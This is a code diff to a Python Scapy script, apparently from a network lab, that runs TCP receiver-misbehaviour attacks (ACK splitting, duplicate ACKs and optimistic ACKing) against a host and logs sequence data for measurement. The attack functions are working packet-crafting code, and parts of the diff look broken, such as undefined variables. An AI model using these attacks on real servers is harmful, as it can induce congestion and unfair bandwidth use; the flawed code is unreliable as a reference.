@@ -10,13 +10,13 @@ import subprocess as sp
 parser = ArgumentParser(description = "Attack and destinations")
 parser.add_argument('--attack', '-a',
     dest = "attack",
-    type = String,
+    type = str,
     help = "Type of attack: normal, split, dup, or opt",
     default = 'normal')
 
 parser.add_argument('--ip', '-i',
     dest = "IP_DST",
-    type = String,
+    type = str,
     help = "IP destination",
     default = '10.0.0.1')
 
@@ -38,6 +38,8 @@ IP_SRC = None
 SRC_PORT = random.randint(1024,65535)
 data = list()
 FIN = 0x01
+initialTs = 0
+initialSeq = 0
 
 socket = conf.L2socket(iface="client-eth0")
 
@@ -55,14 +57,21 @@ def sendSYN():
     request = IP(dst=args.IP_DST) / TCP(window=65535, dport=args.DST_PORT, sport=SRC_PORT,
                 seq=(syn_ack[TCP].ack), ack=(syn_ack[TCP].seq + 1), flags='FA') / getStr
     socket.send(Ether() / request)
+    return (initialTs, initialSeq)
 
 def sendACK(ack_num):
     ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=pkt[TCP].ack, ack=ack_num, flags='A')
     socket.send(Ether() / ack_pkt)
 
+def normal(pkt):
+    
+    data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+    ack_num = pkt[TCP].seq + len(pkt[TCP].payload)
+    sendACK(ack_num)
+
 def split(pkt):
-    sendSYN()
+    data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
     global DST_PORT, IP_DST, data, socket
     if IP not in pkt:
         return
@@ -89,7 +98,7 @@ def split(pkt):
         sendACK(ack_num)
 
 def dup(pkt):
-    sendSYN()
+    data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
     global DST_PORT, IP_DST, data, socket
     if IP not in pkt:
         return
@@ -104,7 +113,7 @@ def dup(pkt):
     for i in range(args.num):
         sendACK(ack_num)
 
-def opt(pkt):
+def opt_acks():
     ack_num = 0
     MTU = 1472
     WAIT_TIME = 0.05
@@ -114,19 +123,28 @@ def opt(pkt):
         sendACK(ack_num)
         time.sleep(WAIT_TIME)
 
-    sendSYN()
+def opt(pkt):
+    data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
 
 
 
 if __name__ == '__main__':
     print("Sniffing......")
+    if args.attack == "normal":
+        (initialTs, initialSeq) = sendSYN()
+        FileName = "npy/normal.npy"
+        sniff(iface="client-eth0", prn=normal, filter="tcp and ip", timeout=4)
     if args.attack == 'split':
+        (initialTs, initialSeq) = sendSYN()
         FileName = "npy/split.npy"       
         sniff(iface="client-eth0", prn=split, filter="tcp and ip", timeout=4)
     if args.attack == 'dup':
+        (initialTs, initialSeq) = sendSYN()
         FileName = "npy/dup.npy"       
         sniff(iface="client-eth0", prn=dup, filter="tcp and ip", timeout=4)
     if args.attack == 'opt':
+        opt_acks()
+        (initialTs, initialSeq) = sendSYN()
         FileName = "npy/op.npy"       
         sniff(iface="client-eth0", prn=opt, filter="tcp and ip", timeout=4)
       
